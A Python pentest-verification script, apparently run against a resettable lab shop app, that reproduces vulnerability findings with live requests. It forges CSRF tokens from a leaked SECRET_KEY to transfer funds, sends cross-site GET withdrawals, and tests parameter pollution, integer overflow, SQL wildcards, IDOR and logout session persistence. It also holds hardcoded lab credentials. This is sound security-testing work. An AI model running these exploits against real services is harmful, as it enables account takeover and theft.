# -*- coding: utf-8 -*-
"""t5 核验 step2：HUNT-02/03/04/09/11/12/13/14/15 + 假阳性复核
一个复位周期内完成：alice 负责资金与 CSRF 证据，demo 负责会话/参数污染证据。
"""
import sys, os, time, re, hmac, hashlib, base64, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from verify_lib_import import *  # noqa
import verify_lib as V

R = []
def rec(tag, **kw):
    entry = {"tag": tag, **kw}
    R.append(entry)
    st = entry.get("status", entry.get("http_status"))
    print(f"[{tag}] status={st} " + str({k: v for k, v in kw.items() if k not in ('body_head',)})[:220])
    return entry

out = {"step": "step2-logic-session", "started": time.strftime("%Y-%m-%dT%H:%M:%S%z")}

# ---------- 干净基线 ----------
rec("S2-reset", **V.req("GET", "/__reset"))
time.sleep(0.3)
out["baseline"] = V.db_snapshot("step2 baseline")
print("baseline counts:", out["baseline"]["counts"])

# ---------- 登录 ----------
tok_a, lr_a = V.login("alice", "alice123")
tok_d, lr_d = V.login("demo", "demo123")
tok_admin, lr_admin = V.login("admin", "Lab@Admin2024!Secure#9")
out["logins"] = {"alice": {"token": tok_a, "status": lr_a.get("status")},
                 "demo": {"token": tok_d, "status": lr_d.get("status")},
                 "admin": {"token": tok_admin, "status": lr_admin.get("status")}}
print("tokens:", {k: (v["token"] or "")[:10] + "…" for k, v in out["logins"].items()})

def bal(u):
    return V.db_scalar("SELECT balance_cents FROM users WHERE username=?", (u,))

# ============================================================
# HUNT-03 /debug 泄露（admin）
# ============================================================
d_admin = V.req("GET", "/debug", headers=V.cookie(tok_admin))
sec = re.search(r"SECRET_KEY&quot;:\s*&quot;([^&]+)&quot;", d_admin["body_head"]) or \
      re.search(r'"SECRET_KEY":\s*"([^"]+)"', d_admin["body_head"])
sec_key = sec.group(1) if sec else None
rec("S2-debug-admin", status=d_admin["status"], len=d_admin["len"],
    secret_key_found=sec_key, body_source="源码 json.dumps(info) 经 html 未转义直出",
    body_head=d_admin["body_head"])
out["secret_key"] = sec_key
out["debug_admin"] = d_admin

# /debug 的 CSRF 值是否等于 HMAC(SECRET_KEY, session_token)（独立计算）
if sec_key:
    calc = hmac.new(sec_key.encode(), tok_admin.encode(), hashlib.sha256).hexdigest()
    page_csrf = re.search(r'name="csrf_token" value="([0-9a-f]{64})"', d_admin["body_head"])
    home_admin = V.req("GET", "/home", headers=V.cookie(tok_admin))
    home_csrf = re.search(r'name="csrf_token" value="([0-9a-f]{64})"', home_admin["body_head"])
    out["hmac_check"] = {
        "calc": calc,
        "page_csrf_debug": page_csrf.group(1) if page_csrf else None,
        "page_csrf_home": home_csrf.group(1) if home_csrf else None,
        "match_home": bool(home_csrf and home_csrf.group(1) == calc),
    }
    print("[S2-hmac]", out["hmac_check"]["match_home"], calc[:16], "…")

# 伪造 token 完成一次真实转账（前/后余额对比）
t_no = V.req("GET", "/wallet/transfer?to=demo&amount=500", headers=V.cookie(tok_admin))
b_admin_0 = bal("admin"); b_demo_0 = bal("demo")
forged = out["hmac_check"]["calc"]
t_fake = V.req("GET", f"/wallet/transfer?to=demo&amount=500&csrf_token={forged}",
               headers=V.cookie(tok_admin))
b_admin_1 = bal("admin"); b_demo_1 = bal("demo")
rec("S2-transfer-no-csrf", status=t_no["status"])
rec("S2-transfer-forged-csrf", status=t_fake["status"], body_head=t_fake["body_head"][:300],
    admin_balance=[b_admin_0, b_admin_1], demo_balance=[b_demo_0, b_demo_1],
    transferred=(b_demo_1 - b_demo_0))
out["hunt03_harm"] = {"no_csrf_status": t_no["status"], "forged_status": t_fake["status"],
                      "admin_before": b_admin_0, "admin_after": b_admin_1,
                      "demo_before": b_demo_0, "demo_after": b_demo_1,
                      "moved_cents": b_demo_1 - b_demo_0,
                      "raw_no_csrf": t_no, "raw_forged": t_fake, "raw_home": home_admin}

# ============================================================
# HUNT-02 业务入口无 CSRF + 方法不限（GET 即真实扣款/建单）
# ============================================================
a0 = bal("alice")
w_get = V.req("GET", "/wallet/withdraw?amount=1000", headers=V.cookie(tok_a))
a1 = bal("alice")
# 跨站场景：带 Sec-Fetch-Site: cross-site 的顶层 GET 导航（真实 CSRF 触发条件）
w_cross = V.req("GET", "/wallet/withdraw?amount=700",
                headers={**V.cookie(tok_a), "Sec-Fetch-Site": "cross-site",
                         "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document",
                         "Referer": "http://evil.example/csrf.html"})
a2 = bal("alice")
# 对照：POST 无 token 同样成功（证明"不只是 GET 问题"，而是彻底无 CSRF 校验）
o_post = V.req("POST", "/order/create",
               headers={**V.cookie(tok_a), "Content-Type": "application/x-www-form-urlencoded"},
               body="product_id=1&qty=1")
a3 = bal("alice")
o_get = V.req("GET", "/order/create?product_id=3&qty=1", headers=V.cookie(tok_a))
a4 = bal("alice")
rec("S2-withdraw-GET", status=w_get["status"], alice=[a0, a1])
rec("S2-withdraw-cross-site-GET", status=w_cross["status"], alice=[a1, a2])
rec("S2-order-create-POST-no-token", status=o_post["status"], alice=[a2, a3])
rec("S2-order-create-GET", status=o_get["status"], alice=[a3, a4])
out["hunt02"] = {
    "withdraw_get": {"status": w_get["status"], "bal": [a0, a1], "delta": a1 - a0},
    "withdraw_cross_site_get": {"status": w_cross["status"], "bal": [a1, a2], "delta": a2 - a1,
                                "req_headers": w_cross["req_headers"]},
    "order_post_no_token": {"status": o_post["status"], "bal": [a2, a3], "delta": a3 - a2},
    "order_get": {"status": o_get["status"], "bal": [a3, a4], "delta": a4 - a3},
    "raw": [w_get, w_cross, o_post, o_get],
}

# /order/status：GET 改单（状态机 + 无 CSRF）
unpaid = V.db_query("SELECT id,user_id,state FROM orders WHERE user_id=(SELECT id FROM users WHERE username='alice') AND state='unpaid'")
target_order = unpaid[0]["id"] if unpaid else None
if target_order:
    s1 = V.req("GET", f"/order/status?order_id={target_order}&state=paid", headers=V.cookie(tok_a))
    st1 = V.db_scalar("SELECT state FROM orders WHERE id=?", (target_order,))
    s2 = V.req("GET", f"/order/status?order_id={target_order}&state=shipped", headers=V.cookie(tok_a))
    st2 = V.db_scalar("SELECT state FROM orders WHERE id=?", (target_order,))
    s3 = V.req("GET", f"/order/status?order_id={target_order}&state=paid", headers=V.cookie(tok_a))
    st3 = V.db_scalar("SELECT state FROM orders WHERE id=?", (target_order,))
    # 跨用户
    s4 = V.req("GET", f"/order/status?order_id={target_order}&state=unpaid", headers=V.cookie(tok_d))
    out["hunt02_order_status"] = {
        "order": target_order,
        "unpaid_to_paid": [s1["status"], st1],
        "paid_to_shipped": [s2["status"], st2],
        "shipped_to_paid_rejected": [s3["status"], st3],
        "cross_user_demo": [s4["status"]],
        "raw": [s1, s2, s3, s4],
    }
    rec("S2-order-status-chain", unpaid_to_paid=[s1["status"], st1],
        paid_to_shipped=[s2["status"], st2], shipped_to_paid=[s3["status"], st3],
        cross_user=[s4["status"]])

# /coupon/claim：GET 领券 + 幂等
c0 = bal("alice")
cl1 = V.req("GET", "/coupon/claim?code=WELCOME10", headers=V.cookie(tok_a))
c1 = bal("alice")
cl2 = V.req("GET", "/coupon/claim?code=WELCOME10", headers=V.cookie(tok_a))
c2 = bal("alice")
out["hunt02_coupon"] = {"first": [cl1["status"], c0, c1], "second": [cl2["status"], c1, c2],
                        "body_second": cl2["body_head"][:300], "raw": [cl1, cl2]}
rec("S2-coupon-claim", first=[cl1["status"], c0, c1], second=[cl2["status"], c1, c2])

# ============================================================
# HUNT-04 登出不销毁服务端会话
# ============================================================
sess_cnt_before = V.db_scalar("SELECT COUNT(*) FROM sessions")
tok_d_before = V.db_query("SELECT token FROM sessions WHERE token=?", (tok_d,))
lo = V.req("GET", "/logout", headers=V.cookie(tok_d))
tok_d_after = V.db_query("SELECT token,user_id FROM sessions WHERE token=?", (tok_d,))
home_after = V.req("GET", "/home", headers=V.cookie(tok_d))
wallet_page = "我的钱包" in home_after["body_head"]
out["hunt04"] = {
    "sessions_total_before": sess_cnt_before,
    "demo_token_row_before": tok_d_before,
    "logout_status": lo["status"],
    "logout_set_cookie": lo["resp_headers"].get("Set-Cookie"),
    "demo_token_row_after": tok_d_after,
    "home_after_logout_status": home_after["status"],
    "home_after_logout_is_wallet_page": wallet_page,
    "raw_logout": lo, "raw_home_after": home_after,
}
rec("S2-logout", status=lo["status"], set_cookie=lo["resp_headers"].get("Set-Cookie"),
    token_still_in_db=bool(tok_d_after), home_after=[home_after["status"], wallet_page])

# ============================================================
# HUNT-09 参数污染：query 覆盖 body
# ============================================================
d0 = bal("demo")
pp1 = V.req("POST", "/wallet/withdraw?amount=1",
            headers={**V.cookie(tok_d), "Content-Type": "application/x-www-form-urlencoded"},
            body="amount=999999")
d1 = bal("demo")
pp2 = V.req("GET", "/wallet/withdraw?amount=13", headers=V.cookie(tok_d))
d2 = bal("demo")
out["hunt09"] = {"query_wins": {"status": pp1["status"], "bal": [d0, d1], "delta": d1 - d0,
                                "expected_if_body_wins": -999999 if d0 < 999999 else None},
                 "control_get": {"status": pp2["status"], "bal": [d1, d2], "delta": d2 - d1},
                 "raw": [pp1, pp2]}
rec("S2-param-pollution", status=pp1["status"], bal=[d0, d1], control=[d1, d2])

# ============================================================
# HUNT-11 整数溢出 500
# ============================================================
d2 = bal("demo")
ov1 = V.req("GET", "/wallet/withdraw?amount=9223372036854775808", headers=V.cookie(tok_d))
d3 = bal("demo")
ov2 = V.req("GET", "/wallet/withdraw?amount=9223372036854775807", headers=V.cookie(tok_d))
d4 = bal("demo")
ov3 = V.req("GET", "/wallet/withdraw?amount=1e23", headers=V.cookie(tok_d))
d5 = bal("demo")
out["hunt11"] = {"2^63": [ov1["status"], d2, d3], "2^63-1": [ov2["status"], d3, d4],
                 "1e23": [ov3["status"], d4, d5],
                 "raw": [ov1, ov2, ov3]}
rec("S2-int-overflow", pow63=[ov1["status"], d2, d3], pow63m1=[ov2["status"], d3, d4],
    oneE23=[ov3["status"], d4, d5])

# ============================================================
# HUNT-12 SQL 模板回显 / LIKE 通配符
# ============================================================
sq1 = V.req("GET", "/api/search?q=k")
sq2 = V.req("GET", "/api/search?q=%25")
sq3 = V.req("GET", "/api/search?q=_")
sq4 = V.req("GET", "/api/search?q=%27")
out["hunt12"] = {
    "sql_leak": "sql" in sq1["body_head"],
    "body_q_k": sq1["body_head"][:300],
    "wildcard_percent_len": sq2["len"], "wildcard_underscore_len": sq3["len"],
    "quote_len": sq4["len"],
    "raw": [sq1, sq2, sq3, sq4],
}
rec("S2-api-search", sql_leak=out["hunt12"]["sql_leak"], pct_len=sq2["len"], quote_len=sq4["len"])

# ============================================================
# HUNT-14 / HUNT-15 / IDOR 阴性复核
# ============================================================
id_alice = V.db_scalar("SELECT id FROM users WHERE username=?", ("alice",))
p_own = V.req("GET", f"/api/profile?id={id_alice}", headers=V.cookie(tok_a))
va = {}
for v in ["+1", "01", "1e0", "1.0", "1\n", " 1 "]:
    import urllib.parse
    r = V.req("GET", "/api/order?id=" + urllib.parse.quote(v), headers=V.cookie(tok_a))
    va[v] = [r["status"], r["body_head"][:120]]
p_cross = V.req("GET", f"/api/profile?id={V.db_scalar('SELECT id FROM users WHERE username=?', ('bob',))}", headers=V.cookie(tok_a))
# 取一条属于 demo(id=2) 的订单做越权读取（alice 会话）
o_demo_id = V.db_scalar("SELECT id FROM orders WHERE user_id=?", (2,))
o_cross = V.req("GET", f"/api/order?id={o_demo_id}", headers=V.cookie(tok_a))
dbg_demo = V.req("GET", "/debug", headers=V.cookie(tok_d))
dbg_demo_user = V.req("GET", "/debug", headers=V.cookie(tok_a))
dbg_anon = V.req("GET", "/debug")
adm_demo1 = V.req("GET", "/admin/users", headers=V.cookie(tok_d))
adm_demo2 = V.req("GET", "/admin/orders", headers=V.cookie(tok_d))
out["idor_negatives"] = {
    "profile_own": [p_own["status"], p_own["body_head"][:200]],
    "profile_cross": [p_cross["status"], p_cross["body_head"][:120]],
    "order_cross": [o_cross["status"]],
    "id_variants": va,
    "debug_demo": dbg_demo["status"], "debug_anon": dbg_anon["status"],
    "admin_users_demo": adm_demo1["status"], "admin_orders_demo": adm_demo2["status"],
    "admin_users_body_has_password": "password" in adm_demo1["body_head"],
    "raw": [p_own, p_cross, o_cross, dbg_demo, dbg_anon, adm_demo1, adm_demo2],
}
rec("S2-idor-negatives", profile_cross=p_cross["status"], order_cross=o_cross["status"],
    debug_demo=dbg_demo["status"], debug_anon=dbg_anon["status"],
    admin_users_demo=adm_demo1["status"], admin_orders_demo=adm_demo2["status"])

# ============================================================
# 假阳性复核：session token 不可预测性（HUNT-04 关联）+ 未授权写
# ============================================================
tok_anon_order = V.req("GET", "/order/create?product_id=3&qty=1")
tok_anon_wd = V.req("GET", "/wallet/withdraw?amount=1")
sess_rows = V.db_query("SELECT token FROM sessions")
out["token_entropy"] = {
    "count": len(sess_rows),
    "lengths": sorted({len(r["token"]) for r in sess_rows}),
    "charset_ok": all(re.fullmatch(r"[A-Za-z0-9_\-]+", r["token"]) for r in sess_rows),
    "sample": [r["token"] for r in sess_rows],
}
out["anon_write_blocked"] = {"order_create_anon": [tok_anon_order["status"],
                                                   tok_anon_order["resp_headers"].get("Location")],
                             "withdraw_anon": [tok_anon_wd["status"],
                                               tok_anon_wd["resp_headers"].get("Location")]}
rec("S2-anon-blocked", order=tok_anon_order["status"], withdraw=tok_anon_wd["status"])

# ============================================================
# HUNT-13 logout CSRF（只读证明：无 Token 校验，直接 302）
# ============================================================
out["hunt13"] = {"logout_no_csrf": out["hunt04"]["logout_status"] == 302 and
                 out["hunt04"]["logout_set_cookie"] is not None}

out["final_state"] = V.db_snapshot("step2 end")
out["all_records_summary"] = [{"tag": r["tag"], "status": r.get("status")} for r in R]
out["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
V.save("verify-02-logic-session-20261012-1855.json", out)
print("alice:", bal("alice"), "demo:", bal("demo"), "admin:", bal("admin"), "bob:", bal("bob"))
